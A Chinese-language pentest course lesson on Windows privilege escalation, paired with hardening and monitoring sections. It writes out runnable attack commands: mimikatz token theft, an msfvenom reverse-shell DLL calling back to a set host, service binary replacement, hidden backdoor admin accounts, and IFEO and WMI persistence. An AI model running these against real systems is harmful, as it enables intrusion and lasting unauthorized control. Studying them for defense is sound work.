# 课时06 Windows提权基础

## 一、课程目标

本节课主要学习Windows系统提权的基础知识和技术。Windows提权是渗透测试中的重要环节，涉及多种技术和方法。通过本课的学习，你将能够：

1. 理解Windows系统权限模型和安全机制
2. 掌握Windows提权的基本原理和分类
3. 学会使用常见的Windows提权工具和技术
4. 了解Windows提权的防护措施和检测方法
5. 熟悉Windows系统安全加固的最佳实践

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| UAC | User Account Control，用户账户控制 |
| Token | 访问令牌，包含用户权限信息 |
| DLL劫持 | 劫持动态链接库加载实现提权 |
| 服务提权 | 利用系统服务配置不当提权 |
| 内核提权 | 利用内核漏洞进行提权 |
| 组策略 | Group Policy，Windows系统管理策略 |
| 注册表 | Windows系统配置数据库 |
| WMI | Windows Management Instrumentation |

## 三、技术原理

### 3.1 Windows权限模型

Windows系统采用基于访问令牌（Token）的权限模型，每个进程都有一个与之关联的访问令牌。

#### 访问令牌组成
1. **用户SID**：用户安全标识符
2. **组SID**：所属组的安全标识符
3. **特权列表**：分配给用户的特权
4. **限制SID**：限制性SID列表
5. **登录SID**：登录会话标识符

#### 权限级别
- **Standard User**：标准用户权限
- **Administrator**：管理员权限
- **SYSTEM**：系统权限
- **TrustedInstaller**：可信安装程序权限

#### 特权类型
```cmd
# 常见特权列表
SeDebugPrivilege         # 调试程序特权
SeBackupPrivilege        # 备份文件和目录特权
SeRestorePrivilege       # 还原文件和目录特权
SeTakeOwnershipPrivilege # 取得文件或其他对象所有权特权
SeTcbPrivilege           # 作为操作系统的一部分特权
SeCreateTokenPrivilege   # 创建令牌对象特权
```

### 3.2 UAC机制

#### UAC工作原理
1. 用户登录时创建两个访问令牌
2. 标准令牌用于日常操作
3. 管理员令牌用于特权操作
4. 需要特权操作时弹出UAC提示

#### UAC级别
- **始终通知**：每次操作都提示
- **仅在程序尝试更改时通知**：默认设置
- **仅在程序尝试更改时通知（不降权桌面）**：较少提示
- **从不通知**：关闭UAC

### 3.3 提权分类

#### 按技术分类
1. **令牌窃取**：窃取高权限进程的访问令牌
2. **DLL劫持**：劫持系统DLL加载实现提权
3. **服务提权**：利用服务配置不当提权
4. **注册表提权**：修改注册表项实现提权
5. **内核提权**：利用内核漏洞进行提权

#### 按权限目标分类
1. **Administrator提权**：从标准用户提升到管理员
2. **SYSTEM提权**：从管理员提升到系统权限
3. **TrustedInstaller提权**：获得可信安装程序权限

## 四、权限信息收集

### 4.1 系统信息收集

#### 基本系统信息
```cmd
# 查看系统版本
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 查看系统架构
wmic os get osarchitecture

# 查看补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 查看环境变量
set
```

#### 用户权限信息
```cmd
# 查看当前用户权限
whoami /priv

# 查看当前用户组
whoami /groups

# 查看所有用户
net user

# 查看管理员组成员
net localgroup administrators
```

### 4.2 进程和服务信息

#### 进程信息收集
```cmd
# 查看运行进程
tasklist /v

# 查看特定进程详细信息
wmic process where name="explorer.exe" get processid,parentprocessid,executablepath

# 查看进程权限
handle -p processname  # 需要Sysinternals工具
```

#### 服务信息收集
```cmd
# 查看所有服务
sc query state=all

# 查看服务详细信息
sc qc servicename

# 查看服务配置
wmic service where name="servicename" get name,startmode,state,pathname

# 查看可写服务
accesschk.exe -uwcqv "Authenticated Users" *  # 需要Sysinternals工具
```

### 4.3 注册表信息收集

#### 注册表权限检查
```cmd
# 检查注册表项权限
icacls "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services"

# 查看启动项
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# 查看服务项
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" /s /f "ImagePath"

# 查看计划任务
schtasks /query /fo LIST /v
```

## 五、常见提权方法

### 5.1 令牌窃取

#### 原理
通过窃取高权限进程的访问令牌来提升权限。

#### 实现方法
```cmd
# 使用incognito工具
incognito.exe list_tokens -u
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# 使用mimikatz
mimikatz # privilege::debug
mimikatz # token::whoami
mimikatz # token::list
mimikatz # token::elevate /user:SYSTEM
```

#### PowerShell实现
```powershell
# PowerShell令牌窃取
# 需要加载相关模块
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser "NT AUTHORITY\SYSTEM"
```

### 5.2 DLL劫持

#### 原理
利用Windows加载DLL时的搜索顺序，将恶意DLL放在优先搜索路径中。

#### 实现步骤
```cmd
# 1. 查找易受攻击的程序
# 查找缺少DLL的程序
procmon.exe  # 使用Process Monitor监控

# 2. 创建恶意DLL
# 使用MSFVenom生成DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o malicious.dll

# 3. 放置DLL到适当位置
copy malicious.dll C:\Program Files\VulnerableApp\
```

#### 防护措施
```cmd
# 启用安全DLL搜索模式
# 在注册表中设置
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode /t REG_DWORD /d 1 /f
```

### 5.3 服务提权

#### 原理
利用服务配置不当，如可写服务二进制文件或配置文件。

#### 检查可写服务
```cmd
# 使用accesschk检查服务权限
accesschk.exe -uwcqv * > services.txt

# 查找可写服务二进制文件
for /f "tokens=2 delims=':'" %a in ('sc query state=all ^| findstr "SERVICE_NAME"') do (
    sc qc %a | findstr "BINARY_PATH_NAME"
)

# 检查服务二进制文件权限
icacls "C:\Program Files\Service\service.exe"
```

#### 利用方法
```cmd
# 1. 备份原始服务二进制文件
copy "C:\Program Files\VulnerableService\service.exe" "C:\Program Files\VulnerableService\service.exe.bak"

# 2. 替换为恶意二进制文件
copy malicious.exe "C:\Program Files\VulnerableService\service.exe"

# 3. 重启服务
sc stop VulnerableService
sc start VulnerableService
```

## 六、自动化提权工具

### 6.1 PowerUp

#### 工具介绍
PowerUp是PowerShell Empire框架中的一个模块，专门用于Windows提权检查。

#### 使用方法
```powershell
# 导入PowerUp模块
Import-Module .\PowerUp.ps1

# 运行所有检查
Invoke-AllChecks

# 检查服务权限
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose

# 检查注册表权限
Get-RegistryAlwaysInstallElevated -Verbose
Get-ModifiableRegistryAutoRun -Verbose

# 检查计划任务
Get-ModifiableScheduledTaskFile -Verbose
```

#### 输出示例
```powershell
# PowerUp输出示例
[*] Checking for unquoted service paths...
[+] Unquoted service path found: VulnerableService
    Path: C:\Program Files\Vulnerable Service\service.exe
    Permissions: Everyone [W]

[*] Checking for modifiable service binaries...
[+] Modifiable service binary found: AnotherService
    Binary: C:\Program Files\Another Service\service.exe
    Permissions: BUILTIN\Users [W]
```

### 6.2 Watson

#### 工具介绍
Watson是一个Windows系统漏洞检查工具，可以识别系统中的已知漏洞。

#### 使用方法
```cmd
# 运行Watson检查
Watson.exe

# 输出示例
[*] OS Build Number: 17763
[*] Audit Checks
[!] CVE-2019-0836 : VULNERABLE
    [>] Process: C:\Windows\System32\winlogon.exe
    [>] Handle: 0x738
[!] CVE-2019-0841 : VULNERABLE
    [>] Process: C:\Windows\System32\werfault.exe
    [>] Handle: 0x76c
```

### 6.3 自定义检查脚本

```powershell
# Windows提权检查脚本
function Invoke-WindowsPrivescCheck {
    Write-Host "=== Windows提权检查工具 ===" -ForegroundColor Green
    Write-Host "检查时间: $(Get-Date)" -ForegroundColor Yellow
    Write-Host ""

    # 1. 检查当前权限
    Write-Host "1. 当前用户权限检查:" -ForegroundColor Cyan
    $currentUser = whoami
    Write-Host "   当前用户: $currentUser"
    
    $privileges = whoami /priv
    Write-Host "   用户特权:"
    $privileges | ForEach-Object { Write-Host "     $_" }

    # 2. 检查管理员权限
    Write-Host "`n2. 管理员权限检查:" -ForegroundColor Cyan
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if ($isAdmin) {
        Write-Host "   [+] 当前具有管理员权限" -ForegroundColor Green
    } else {
        Write-Host "   [-] 当前不具有管理员权限" -ForegroundColor Red
    }

    # 3. 检查UAC状态
    Write-Host "`n3. UAC状态检查:" -ForegroundColor Cyan
    $uacEnabled = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" | Select-Object -ExpandProperty EnableLUA
    if ($uacEnabled -eq 1) {
        Write-Host "   [+] UAC已启用" -ForegroundColor Green
    } else {
        Write-Host "   [-] UAC已禁用" -ForegroundColor Red
    }

    # 4. 检查服务权限
    Write-Host "`n4. 服务权限检查:" -ForegroundColor Cyan
    try {
        $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.State -eq "Running" }
        foreach ($service in $services) {
            $binaryPath = $service.PathName
            if ($binaryPath -and $binaryPath -notmatch '"') {
                # 检查未加引号的服务路径
                Write-Host "   [警告] 发现未加引号的服务路径: $($service.Name)" -ForegroundColor Yellow
                Write-Host "         路径: $binaryPath" -ForegroundColor Yellow
            }
        }
    } catch {
        Write-Host "   [!] 无法检查服务权限: $_" -ForegroundColor Red
    }

    # 5. 检查注册表权限
    Write-Host "`n5. 注册表权限检查:" -ForegroundColor Cyan
    $registryPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SYSTEM\CurrentControlSet\Services"
    )

    foreach ($path in $registryPaths) {
        try {
            $acl = Get-Acl -Path $path
            $access = $acl.Access | Where-Object { $_.FileSystemRights -match "Write" -and $_.IdentityReference -notmatch "BUILTIN\Administrators|NT AUTHORITY\SYSTEM" }
            if ($access) {
                Write-Host "   [警告] 发现可写的注册表项: $path" -ForegroundColor Yellow
                $access | ForEach-Object {
                    Write-Host "         用户: $($_.IdentityReference) 权限: $($_.FileSystemRights)" -ForegroundColor Yellow
                }
            }
        } catch {
            Write-Host "   [!] 无法检查注册表项 $path : $_" -ForegroundColor Red
        }
    }

    Write-Host "`n=== 检查完成 ===" -ForegroundColor Green
}

# 运行检查
Invoke-WindowsPrivescCheck
```

## 七、手动提权技术

### 7.1 计划任务提权

#### 原理
利用可修改的计划任务实现提权。

#### 检查方法
```cmd
# 查看所有计划任务
schtasks /query /fo LIST /v

# 查看特定用户的计划任务
schtasks /query /fo LIST /v /u username

# 查看任务XML文件
dir C:\Windows\System32\Tasks\ /s

# 检查任务文件权限
icacls "C:\Windows\System32\Tasks\*"
```

#### 利用方法
```cmd
# 1. 创建恶意任务XML
# task.xml内容示例
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\cmd.exe</Command>
      <Arguments>/c net user backdoor backdoor123 /add &amp;&amp; net localgroup administrators backdoor /add</Arguments>
    </Exec>
  </Actions>
</Task>

# 2. 导入任务
schtasks /create /tn "BackdoorTask" /xml task.xml /ru SYSTEM

# 3. 运行任务
schtasks /run /tn "BackdoorTask"
```

### 7.2 注册表提权

#### 原理
修改注册表启动项或服务项实现提权。

#### 常见注册表位置
```cmd
# 启动项位置
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

# 服务项位置
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
```

#### 利用方法
```cmd
# 1. 添加启动项
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# 2. 修改服务项
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnerableService\Parameters" /v "ServiceDLL" /t REG_SZ /d "C:\Windows\Temp\malicious.dll" /f

# 3. 利用Image File Execution Options
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

## 八、权限维持

### 8.1 后门创建

#### 创建隐藏管理员账户
```cmd
# 1. 创建隐藏账户
net user backdoor$ backdoor123 /add
net localgroup administrators backdoor$ /add

# 2. 隐藏账户（通过修改SAM数据库）
# 需要专业工具如creddump7

# 3. 创建服务后门
sc create "BackdoorService" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start BackdoorService
```

#### SSH后门
```cmd
# 安装OpenSSH服务器
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# 启动SSH服务
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# 配置防火墙
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

# 添加SSH密钥
mkdir C:\ProgramData\ssh
# 将公钥添加到administrators_authorized_keys文件
```

### 8.2 WMI后门

#### WMI事件订阅后门
```powershell
# 创建WMI事件消费者
$consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root/subscription" -Arguments @{
    Name = "BackdoorConsumer"
    ScriptingEngine = "VBScript"
    ScriptText = @"
CreateObject("WScript.Shell").Run "C:\Windows\Temp\backdoor.exe", 0, False
"@
}

# 创建事件过滤器
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root/subscription" -Arguments @{
    Name = "BackdoorFilter"
    EventNamespace = "root/cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 绑定过滤器和消费者
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root/subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

## 九、防护措施

### 9.1 系统加固

#### UAC配置
```cmd
# 设置UAC为最高级别
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f
```

#### 服务加固
```cmd
# 禁用不必要的服务
sc config "Spooler" start= disabled
sc config "lmhosts" start= disabled

# 设置服务权限
sc sdset "VulnerableService" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
```

#### 注册表加固
```cmd
# 限制注册表编辑器
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

# 限制任务管理器
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
```

### 9.2 监控和审计

#### 事件日志监控
```cmd
# 启用审核策略
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable

# 查看安全日志
wevtutil qe Security /c:10 /rd:true /f:text
```

#### Sysmon配置
```xml
<!-- Sysmon配置文件示例 -->
<Sysmon schemaversion="4.30">
    <EventFiltering>
        <ProcessCreate onmatch="include">
            <Image condition="contains">mimikatz</Image>
            <Image condition="contains">psexec</Image>
        </ProcessCreate>
        <RegistryEvent onmatch="include">
            <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
        </RegistryEvent>
    </EventFiltering>
</Sysmon>
```

### 9.3 安全基线

#### CIS基准配置
```cmd
# 应用CIS Windows基准
# 下载CIS基准工具
# 运行基准检查
cis-cat.bat -b "CIS_Microsoft_Windows_Server_2019_Benchmark_v1.0.0-xccdf.xml" -p Default -t "-Dplugin.verbose=true"
```

#### 组策略强化
```cmd
# 启用LSA保护
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# 禁用WDigest认证
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v Negotiate /t REG_DWORD /d 0 /f
```

## 十、实战案例

### 10.1 Windows提权完整流程

#### 信息收集阶段
```powershell
# 1. 收集系统信息
systeminfo
whoami /all
net user
net localgroup administrators

# 2. 检查可利用漏洞
# 使用Sherlock或Watson脚本
Import-Module .\Sherlock.ps1
Find-AllVulns

# 3. 检查服务权限
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

#### 利用阶段
```cmd
# 4. 根据检查结果选择利用方法
# 例如，如果发现未加引号的服务路径
# 备份原始服务二进制文件
copy "C:\Program Files\Vulnerable Service\service.exe" "C:\Program Files\Vulnerable Service\service.exe.bak"

# 替换为恶意二进制文件
copy malicious.exe "C:\Program Files\Vulnerable Service\service.exe"

# 重启服务
sc stop VulnerableService
sc start VulnerableService
```

#### 权限验证
```cmd
# 5. 验证提权结果
whoami
whoami /groups
whoami /priv

# 6. 执行特权操作
# 例如添加管理员用户
net user backdoor backdoor123 /add
net localgroup administrators backdoor /add
```

### 10.2 复杂环境提权

#### 多层次利用
```powershell
# 1. 首先尝试令牌窃取
# 使用incognito或mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate /user:SYSTEM

# 2. 如果失败，尝试服务提权
# 检查可写服务
Get-ModifiableServiceFile -Verbose

# 3. 如果仍失败，尝试DLL劫持
# 查找易受攻击的程序
Get-UnquotedService -Verbose
```

## 十一、故障排除

### 11.1 常见问题

#### 权限不足
```cmd
# 检查当前权限
whoami
whoami /priv

# 检查UAC状态
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA

# 尝试绕过UAC
# 使用UACME等工具
```

#### 工具执行失败
```powershell
# 检查执行策略
Get-ExecutionPolicy

# 设置执行策略（谨慎使用）
Set-ExecutionPolicy Bypass -Scope Process

# 检查防病毒软件
# 可能需要暂时禁用或添加例外
```

### 11.2 系统恢复

#### 服务恢复
```cmd
# 恢复被修改的服务
# 恢复原始二进制文件
copy "C:\Program Files\Vulnerable Service\service.exe.bak" "C:\Program Files\Vulnerable Service\service.exe"

# 重启服务
sc stop VulnerableService
sc start VulnerableService
```

#### 注册表恢复
```cmd
# 恢复注册表修改
# 删除添加的启动项
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /f

# 恢复修改的服务项
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnerableService\Parameters" /v "ServiceDLL" /t REG_SZ /d "C:\Original\path\to\service.dll" /f
```

## 十二、课后作业

1. **基础练习**：
   - 在实验环境中搭建Windows测试环境
   - 练习使用PowerUp进行提权检查
   - 学习常见的Windows提权方法
   - 验证提权结果并清理环境

2. **进阶练习**：
   - 编写自定义Windows提权检查脚本
   - 实现多种提权技术的实际操作
   - 配置Windows系统防护措施
   - 研究新的Windows提权技术

3. **思考题**：
   - Windows提权相比Linux提权有哪些特殊性？
   - 如何在不影响系统正常运行的前提下进行安全加固？
   - 现代Windows系统如何防御常见的提权攻击？

4. **扩展阅读**：
   - 研究Windows内核漏洞利用技术
   - 了解Windows安全子系统实现原理
   - 学习高级威胁检测和响应技术